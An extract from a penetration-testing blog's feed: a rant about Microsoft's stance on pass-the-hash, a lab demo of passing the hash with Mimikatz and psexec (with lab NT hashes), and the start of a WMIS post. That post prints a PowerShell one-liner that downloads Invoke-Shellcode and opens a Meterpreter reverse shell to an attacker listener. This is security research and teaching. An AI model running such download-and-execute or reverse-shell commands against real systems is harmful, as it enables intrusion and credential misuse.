term="SSO"/><category scheme="http://www.blogger.com/atom/ns#" term="twitter"/><title type='text'>Why We Don&#39;t Get It and Why We Shouldn&#39;t</title><content type='html'>Warning: This is a rant with a few technical details sprinkled in.&lt;br /&gt;&lt;br /&gt;It is 2014.&lt;br /&gt;&lt;br /&gt;Would you voluntarily store your sensitive data with an organization that...&lt;br /&gt;&lt;br /&gt;&lt;a href=&quot;http://blog.gentilkiwi.com/mimikatz&quot;&gt;stores your password essentially in clear text?&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;http://media.blackhat.com/bh-us-12/Briefings/Duckwall/BH_US_12_Duckwall_Campbell_Still_Passing_WP.pdf&quot;&gt;stores it somewhere else as an unsalted hash?&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;http://passing-the-hash.blogspot.com/2012/12/wth-is-pth.html&quot;&gt;treats password hashes as an equivalent to a password?&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;http://passing-the-hash.blogspot.com/2012/07/using-pth-firefox.html&quot;&gt;can&#39;t tell the difference between when the hash was used or the password?&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/&quot;&gt;introduces a mitigation feature that actually makes the problem a bit worse?&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;http://obscuresecurity.blogspot.com/2013/07/get-gpppassword.html&quot;&gt;tells you they are properly encrypting your administrative and service passwords?&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Smart_card&quot;&gt;introduces two-factor authentication support but doesn&#39;t actually enforce it in some cases?&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;Hopefully, you answered &quot;NO!&quot; to all of those questions, but its very likely that you are doing all of those things in your enterprise. Congratulations, by utilizing Microsoft Windows you have inherited all of those problems and more! All of the data that resides on Windows-based file servers, SharePoint servers and Exchange servers are all at risk, but according to Microsoft this is not a &quot;Windows Problem&quot;:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-N8zrcEXKxy8/UxIxezzBFfI/AAAAAAAABCM/JWTrEL0ijBw/s1600/pthequalssso.JPG&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-N8zrcEXKxy8/UxIxezzBFfI/AAAAAAAABCM/JWTrEL0ijBw/s1600/pthequalssso.JPG&quot; height=&quot;288&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;The title of the slide seems to be where Microsoft goes wrong. They assert that Pass-the-Hash (PtH) is the same thing as Single-Sign On (SSO). It is not. The PtH attack is viable because of how Microsoft designed their authentication architecture decades ago. So to fix the title of that slide:&lt;br /&gt;&lt;blockquote class=&quot;twitter-tweet&quot; lang=&quot;en&quot;&gt;PtH == MS&#39; broken SSO implementation &amp;lt;-----fixed your slide for you Mark.&lt;br /&gt;— Chris (@obscuresec) &lt;a href=&quot;https://twitter.com/obscuresec/statuses/439815521966387200&quot;&gt;March 1, 2014&lt;/a&gt;&lt;/blockquote&gt;&lt;script async=&quot;&quot; charset=&quot;utf-8&quot; src=&quot;//platform.twitter.com/widgets.js&quot;&gt;&lt;/script&gt; There are other logical problems with the slide, but the content is generally correct. PtH can&#39;t be &quot;fixed&quot; within the constructs of the currently broken authentication model. Whose problem is that? If you are a Windows user, apparently it is yours.&lt;br /&gt;&lt;br /&gt;&lt;blockquote class=&quot;twitter-tweet&quot; lang=&quot;en&quot;&gt;&lt;a href=&quot;https://twitter.com/obscuresec&quot;&gt;@obscuresec&lt;/a&gt; &lt;a href=&quot;https://twitter.com/scriptjunkie1&quot;&gt;@scriptjunkie1&lt;/a&gt; &lt;a href=&quot;https://twitter.com/Fake4d&quot;&gt;@Fake4d&lt;/a&gt; sorry you guys don&#39;t get it. Too bad you won&#39;t be at &lt;a href=&quot;https://twitter.com/RSAConference&quot;&gt;@RSAConference&lt;/a&gt; to watch.&lt;br /&gt;— Mark Russinovich (@markrussinovich) &lt;a href=&quot;https://twitter.com/markrussinovich/statuses/437799675718955008&quot;&gt;February 24, 2014&lt;/a&gt;&lt;/blockquote&gt;&lt;script async=&quot;&quot; charset=&quot;utf-8&quot; src=&quot;//platform.twitter.com/widgets.js&quot;&gt;&lt;/script&gt; &lt;br /&gt;You were absolutely correct before you blocked us on twitter, we don&#39;t get it. We&amp;nbsp;really don&#39;t get it. Why do we have to accept this vulnerability just because you assert that it is a feature? (On another note, Why would we pay to see a talk that you and other Microsoft employees have already given many times?)&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-UbxZBC6d8cY/UxJDT3Dc9XI/AAAAAAAABCc/3k3uRwW5WTA/s1600/mark_russ_block.JPG&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-UbxZBC6d8cY/UxJDT3Dc9XI/AAAAAAAABCc/3k3uRwW5WTA/s1600/mark_russ_block.JPG&quot; height=&quot;49&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;br /&gt;&lt;/div&gt;We applaud your efforts to make Windows more secure going forward, but convoluting token manipulation and PtH is wrong. Please stop doing it. Furthermore, if your SSO-model means that an attacker can masquerade undetected as any user (without having to crack passwords) - IT IS BROKEN.&lt;br /&gt;&lt;br /&gt;When will you stop hiding behind your dated &quot;&lt;a href=&quot;http://technet.microsoft.com/library/cc722487.aspx&quot;&gt;Laws of Security&lt;/a&gt;&quot;? They are true for Windows, but should they be? Should an attacker be able to knock over a domain controller and have access to all of your data? Should an admin be able to easily gain access to all data on the system regardless of ACLs?&lt;br /&gt;&lt;br /&gt;The new mitigation techniques are long overdue band-aides and do nothing to stop and attacker who has already taken over your domain. The model is broken Microsoft. Fix it.&lt;br /&gt;&lt;br /&gt;Oh yeah, I support this:&lt;br /&gt;&lt;blockquote class=&quot;twitter-tweet&quot; lang=&quot;en&quot;&gt;&lt;a href=&quot;https://twitter.com/obscuresec&quot;&gt;@obscuresec&lt;/a&gt; &lt;a href=&quot;https://twitter.com/jcran&quot;&gt;@jcran&lt;/a&gt; &lt;a href=&quot;https://twitter.com/passingthehash&quot;&gt;@passingthehash&lt;/a&gt; MARCH IS PASS-THE-HASH AWARENESS MONTH&lt;br /&gt;— scriptjunkie (@scriptjunkie1) &lt;a href=&quot;https://twitter.com/scriptjunkie1/statuses/439827158899240960&quot;&gt;March 1, 2014&lt;/a&gt;&lt;/blockquote&gt;&lt;script async=&quot;&quot; charset=&quot;utf-8&quot; src=&quot;//platform.twitter.com/widgets.js&quot;&gt;&lt;/script&gt; &lt;br /&gt;-Chris&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/130486869577692175/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2014/03/dontgetpth.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/130486869577692175'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/130486869577692175'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2014/03/dontgetpth.html' title='Why We Don&#39;t Get It and Why We Shouldn&#39;t'/><author><name>Chris</name><uri>http://www.blogger.com/profile/10815120708533310068</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='31' height='20' src='http://1.bp.blogspot.com/-Sk9GkEyCexY/TrsYLkcp-1I/AAAAAAAAAYg/IPX7mbAvGvE/s220/obscuresec.png'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://1.bp.blogspot.com/-N8zrcEXKxy8/UxIxezzBFfI/AAAAAAAABCM/JWTrEL0ijBw/s72-c/pthequalssso.JPG" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-6565051450237164509</id><published>2014-02-22T20:41:00.001-08:00</published><updated>2014-02-22T21:04:50.032-08:00</updated><title type='text'>Pre RSA Conference Demo - Win 8.1 attack machine vs 2012r2 DC w/ Win 8.1 client</title><content type='html'>&lt;h2&gt;The Story Thus Far...&lt;/h2&gt;So on the twitters today, Sam Bowne (@sambowne / http://samsclass.info) continued on a partial conversation started earlier in the week with @obscuresec / myself regarding an upcoming RSA talk. &amp;nbsp;The RSA talk is entitled &quot;Pass-the-Hash: How Attackers Spread and How to Stop Them&quot; by Mark Russinovich and Nathan Ide, both from Microsoft. &amp;nbsp;The slides can apparently be found here:&amp;nbsp;http://www.rsaconference.com/writable/presentations/file_upload/hta-w03-pass-the-hash-how-attackers-spread-and-how-to-stop-them.pdf&lt;br /&gt;&lt;br /&gt;I respect the work that the folks at Microsoft have put into trying to lessen the impact of PTH attacks on Microsoft products. &amp;nbsp;However, I feel obligated to point out that claims that something &quot;stops PTH attacks&quot; is at best an exaggeration and at worst a bold-faced lie of a delusional mind.&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Repeat After Me : &amp;nbsp;PTH is By Design Functionality&lt;/h2&gt;&lt;div&gt;This is the way NTLM works. &amp;nbsp;All authentication operations work on the password hash. &amp;nbsp;Internally the NTLM security provider only saves the username / hash for use during Single Sign On. &amp;nbsp;If it needed more, it would have saved more. &amp;nbsp;Just ask the Digest SSP, which saves the username / plaintext password.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;PTH attacks cannot be stopped unless you disable NTLM. &amp;nbsp;Period. &amp;nbsp; End of story / paragraph / book / library. &amp;nbsp;They can only be mitigated or made more challenging.&lt;/div&gt;&lt;h2&gt;The Demo Setup&lt;/h2&gt;&lt;div&gt;I have a VMWare virtual network set up with 3 hosts.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;1 domain controller (172.19.1.1) running Server 2012 R2 running in 2012r2 functional level&lt;/div&gt;&lt;div&gt;1 domain client machine (172.19.1.5) running Windows 8.1&lt;/div&gt;&lt;div&gt;1 attack machine (172.19.1.10) running Windows 8.1&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;All machines are fully patched as of today : 2/22/2014.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I have disabled Windows Defender and the Windows firewall on all machines. &amp;nbsp;I also re-enabled the local administrator accounts on both Windows 8.1 machines, as they are disabled by default. &amp;nbsp;In addition, on the attack machine only I disabled UAC.&lt;br /&gt;&lt;br /&gt;&lt;b&gt;&lt;u&gt;Aside from the above changes, these are stock builds. &amp;nbsp;No registry settings have been changed.&lt;/u&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;In the domain I have created several users, but for the purposes of the demo I used the domain administrator.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;For attack tools I am using the latest version of Mimikatz (@gentilkiwi / http://http://blog.gentilkiwi.com/mimikatz) and Mr. Russinovich&#39;s venerable psexec tool from Microsoft&#39;s Sysinternals.&lt;br /&gt;&lt;br /&gt;All hashes will crack with a 4x4 character keyboard pattern if you&#39;re bored ;-) &amp;nbsp;I made separate passwords for each account in use to ensure nothing weird happened with accounts with the same PW.&lt;br /&gt;&lt;br /&gt;The accounts:&lt;br /&gt;172.19.1.1&lt;br /&gt;administrator, Member of Domain Admins group, built-in 500 account&lt;br /&gt;NT hash:&amp;nbsp;821C5CA39C55B70ADF80CADAFBFCD849&lt;/div&gt;&lt;div&gt;172.19.1.5 -&amp;nbsp;&lt;/div&gt;&lt;div&gt;Administrator - Member of the local &#39;administrators&#39; group, built-in 500 account&lt;br /&gt;NT hash:&amp;nbsp;0C1F997A0830BBFB8167F49B1ED59D15&lt;br /&gt;Skip - Member of the local &#39;administrators&#39; group&lt;br /&gt;NT hash:&amp;nbsp;57C8A8C6D4FC8CCA2EAC7D4DC2C6576A&lt;br /&gt;&lt;br /&gt;172.19.1.10 -&lt;br /&gt;attackadmin - Member of the local &#39;administrators&#39; group, built-in 500 account&lt;br /&gt;nt hash:&amp;nbsp;8189A242FEAC3582A0A084D199EDCD2C&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Let&#39;s Fire Some Binary Bullets!&lt;/h2&gt;Here&#39;s a screenshot of the attack machine. &amp;nbsp;Note that the attack machine has a reddish desktop for clarity:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-UxubIjoKmVE/Uwl11huTENI/AAAAAAAAAF0/VDm20EnXN40/s1600/81-attack.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://2.bp.blogspot.com/-UxubIjoKmVE/Uwl11huTENI/AAAAAAAAAF0/VDm20EnXN40/s1600/81-attack.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;Here&#39;s a screenshot of the Win 8.1 domain client machine. &amp;nbsp;Note it has a black background to differentiate it from the attack machine:&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-JsHaFK5vEpw/Uwl12LKgg3I/AAAAAAAAAGU/WLLq6TbAu0s/s1600/81-client.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-JsHaFK5vEpw/Uwl12LKgg3I/AAAAAAAAAGU/WLLq6TbAu0s/s1600/81-client.jpg&quot; height=&quot;478&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;We are going to use the Mimikatz to create a new process with a specified hash on our attack machine. &amp;nbsp;Note that you must have enabled debug privileges in order for it to work properly.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-IsP2Zl49yRI/Uwl12wHd0lI/AAAAAAAAAGg/bpd_8ypQU30/s1600/attack-pth1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://2.bp.blogspot.com/-IsP2Zl49yRI/Uwl12wHd0lI/AAAAAAAAAGg/bpd_8ypQU30/s1600/attack-pth1.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;The command prompt that opened up can now be used with psexec to connect to the Windows 8.1 client. &amp;nbsp;Note that since the attack machine is NOT domain joined, the only way to log in without specifying a username and password is via the process token that was created.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-jDmF3oYtYTI/Uwl13OyqY_I/AAAAAAAAAG4/xqOeTJijtGU/s1600/attack-pth2.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-jDmF3oYtYTI/Uwl13OyqY_I/AAAAAAAAAG4/xqOeTJijtGU/s1600/attack-pth2.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;/div&gt;As you can see, we have logged into the Windows 8.1 domain client as &quot;2012r2\administrator&quot; or the domain administrator account. &lt;br /&gt;&lt;br /&gt;Here we log into the 2012r2 domain controller in the same fashion:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-2pbiPNoLd5Y/Uwl13Qp0JDI/AAAAAAAAAGs/UdQu1V0sGXI/s1600/attack-pth3.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-2pbiPNoLd5Y/Uwl13Qp0JDI/AAAAAAAAAGs/UdQu1V0sGXI/s1600/attack-pth3.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;So as of right now, neither Windows 8.1 or Windows 2012 R2 stock prevents a domain administrator account from using PTH to access these machines. &amp;nbsp;This is the expected behavior.&lt;br /&gt;&lt;br /&gt;Where things get interesting is when we try to use a non-500 account local administrator to log into the Windows 8.1 client. &lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-ZVk47qYtDO4/Uwl12WzK_vI/AAAAAAAAAGM/WcU4ItNuKns/s1600/attack-fail1.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-ZVk47qYtDO4/Uwl12WzK_vI/AAAAAAAAAGM/WcU4ItNuKns/s1600/attack-fail1.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;/div&gt;By default on Vista+ versions of Windows, members of the local admin groups via UAC are not allowed to access the computer via the network. &amp;nbsp;(Technically this is because of privileged token filtering, however this bit gets flipped on the back end when UAC is enabled.)&lt;br /&gt;&lt;br /&gt;However, by default on Vista+, the local 500 account is not subject to UAC or the token filtering so that account can log right in.&lt;br /&gt;&lt;br /&gt;Here&#39;s a screenshot of the Local Security Policy on the Windows 8.1 client:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-b-r3S_X7ENM/Uwl11zSifvI/AAAAAAAAAGA/uKBKl6jXUQI/s1600/81-client-localsecpol.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://3.bp.blogspot.com/-b-r3S_X7ENM/Uwl11zSifvI/AAAAAAAAAGA/uKBKl6jXUQI/s1600/81-client-localsecpol.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;And here&#39;s me using psexe to log in as the local 500 administrator:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-SPAqM3fLqT8/Uwl13sbc6mI/AAAAAAAAAG0/xctAdYr8SwA/s1600/attack-pth4.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://3.bp.blogspot.com/-SPAqM3fLqT8/Uwl13sbc6mI/AAAAAAAAAG0/xctAdYr8SwA/s1600/attack-pth4.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;In order to make it so the local administrator account that failed could log in, we need to modify the client&#39;s registry to disable the token filtering feature from working. &amp;nbsp;Alternatively, we could have just disabled UAC and that would have also worked.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://1.bp.blogspot.com/-L9q_RRqKaG0/Uwl12AhxL2I/AAAAAAAAAG8/MWbsfzV_-mM/s1600/81-client-reg-change.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://1.bp.blogspot.com/-L9q_RRqKaG0/Uwl12AhxL2I/AAAAAAAAAG8/MWbsfzV_-mM/s1600/81-client-reg-change.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;After adding this registry setting, we can log in via psexec as the user &#39;skip&#39;.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-xWUO4pi9CKM/Uwl12ipRpaI/AAAAAAAAAGY/MQCpMtrMOQo/s1600/attack-nofail.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://4.bp.blogspot.com/-xWUO4pi9CKM/Uwl12ipRpaI/AAAAAAAAAGY/MQCpMtrMOQo/s1600/attack-nofail.jpg&quot; height=&quot;480&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Some Closing Thoughts&lt;/h2&gt;&lt;/div&gt;&lt;div&gt;It is worth noting that the default 500 administrator is disabled by default. &amp;nbsp;This is done for a reason since it has separate UAC permissions in the local security policy.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;However, based on my personal experience as a pentester this environment is not terribly realistic for several reasons, all of them bad.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;1) &amp;nbsp;I&#39;ve never seen a 2012 domain in production, let alone a 2012 R2 domain.&lt;/div&gt;&lt;div&gt;2) &amp;nbsp;I&#39;ve never seen any Windows 8 in production, let alone 8.1.&lt;/div&gt;&lt;div&gt;3) &amp;nbsp;Many places I&#39;ve visited have the local 500 account enabled.&lt;/div&gt;&lt;div&gt;4) &amp;nbsp;Many places I&#39;ve visited have disabled UAC.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;I could go on and on....&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/6565051450237164509/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2014/02/pre-rsa-conference-demo-win-81-attack.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6565051450237164509'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/6565051450237164509'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2014/02/pre-rsa-conference-demo-win-81-attack.html' title='Pre RSA Conference Demo - Win 8.1 attack machine vs 2012r2 DC w/ Win 8.1 client'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://2.bp.blogspot.com/-UxubIjoKmVE/Uwl11huTENI/AAAAAAAAAF0/VDm20EnXN40/s72-c/81-attack.jpg" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-1861989554793120034</id><published>2013-07-19T20:36:00.000-07:00</published><updated>2013-07-19T20:40:50.111-07:00</updated><category scheme="http://www.blogger.com/atom/ns#" term="base64"/><category scheme="http://www.blogger.com/atom/ns#" term="meterpreter"/><category scheme="http://www.blogger.com/atom/ns#" term="pass-the-hash"/><category scheme="http://www.blogger.com/atom/ns#" term="powershell"/><category scheme="http://www.blogger.com/atom/ns#" term="powersploit"/><category scheme="http://www.blogger.com/atom/ns#" term="python"/><category scheme="http://www.blogger.com/atom/ns#" term="unicode"/><category scheme="http://www.blogger.com/atom/ns#" term="wmi"/><category scheme="http://www.blogger.com/atom/ns#" term="wmis"/><title type='text'>WMIS: The Missing Piece of the Ownage Puzzle</title><content type='html'>The unsung hero of the PTH-Suite is definitely WMIS. It has replaced several other tools that I previously used to pass the hash. It is essentially the Linux equivalent to &lt;a href=&quot;http://msdn.microsoft.com/en-us/library/windows/desktop/aa394531(v=vs.85).aspx&quot;&gt;WMIC&lt;/a&gt;&amp;nbsp;and the&amp;nbsp;&quot;process call create&quot; query. The advantage of WMI over other methods of remote command execution is that it doesn&#39;t doesn&#39;t rely on SMB and starting a service on the remote host. &amp;nbsp;In most cases, it flies beneath the radar and it just might be the easiest way to get a shell on a remote host all without writing to the disk.&lt;br /&gt;&lt;br /&gt;I recently wrote a post on &lt;a href=&quot;http://www.pentestgeek.com/2013/07/19/invoke-shellcode/&quot;&gt;Pentest Geek&lt;/a&gt; about how easy it easy it is to get a Meterpreter shell from a PowerShell console by using &lt;a href=&quot;http://www.exploit-monday.com/&quot;&gt;Matt Graeber&#39;s&lt;/a&gt; PowerSploit function &lt;a href=&quot;https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1&quot;&gt;Invoke-Shellcode&lt;/a&gt;. WMIS with a password hash (or password) is essentially like being able to run a single cmd.exe command at a time. There are lots of ways to turn that type of access into a shell, but few are as easy as this.&lt;br /&gt;&lt;br /&gt;The first step is to properly install WMIS as described &lt;a href=&quot;http://passing-the-hash.blogspot.com/2013/04/pth-toolkit-for-kali-interim-status.html&quot;&gt;here&lt;/a&gt;. Unfortunately, those steps need to be followed even today for x64 versions of Kali.&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://3.bp.blogspot.com/-BzbyfnAGNl4/UejEvjKP6dI/AAAAAAAAA6k/nuiZwC5I_Ik/s1600/wmis.JPG&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;118&quot; src=&quot;http://3.bp.blogspot.com/-BzbyfnAGNl4/UejEvjKP6dI/AAAAAAAAA6k/nuiZwC5I_Ik/s400/wmis.JPG&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Now that we have WMIS installed, we can start our Meterpreter handler. I prefer to use this &lt;a href=&quot;https://github.com/obscuresec/random/blob/master/StartListener.py&quot;&gt;script&lt;/a&gt;&amp;nbsp;to automate the process:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-XX20YYYbazc/UejCVplGjzI/AAAAAAAAA6U/Sbe5IDcDhlk/s1600/script.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;338&quot; src=&quot;http://2.bp.blogspot.com/-XX20YYYbazc/UejCVplGjzI/AAAAAAAAA6U/Sbe5IDcDhlk/s400/script.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Next, we need to build the PowerShell code we want to execute to get our shell:&lt;br /&gt;&lt;br /&gt;&lt;b&gt;IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/14bZZ0c’); Invoke-Shellcode –Payload windows/meterpreter/reverse_https –Lhost 192.168.0.15 –Lport 443 –Force&lt;/b&gt;&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;What this is doing is utilizing Invoke-Expression (aliased to IEX) to execute what is downloaded with the .Net webclient. The &lt;a href=&quot;https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1&quot;&gt;Invoke-Shellcode&lt;/a&gt;&amp;nbsp;function is being downloaded and ran in memory and we are appending the options we need to get our shell.&lt;br /&gt;&lt;br /&gt;Now we need to convert this script block into something that cmd.exe understands. The best way to do that is to base64 encode the scriptblock which can also be accomplished with another simple &lt;a href=&quot;https://github.com/obscuresec/random/blob/master/EncodeShell.py&quot;&gt;python script&lt;/a&gt;:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-F9fkZHhxgvQ/Uenzp1tgDsI/AAAAAAAAA64/pQTwKFDKw74/s1600/wmis_encoding.JPG&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;640&quot; 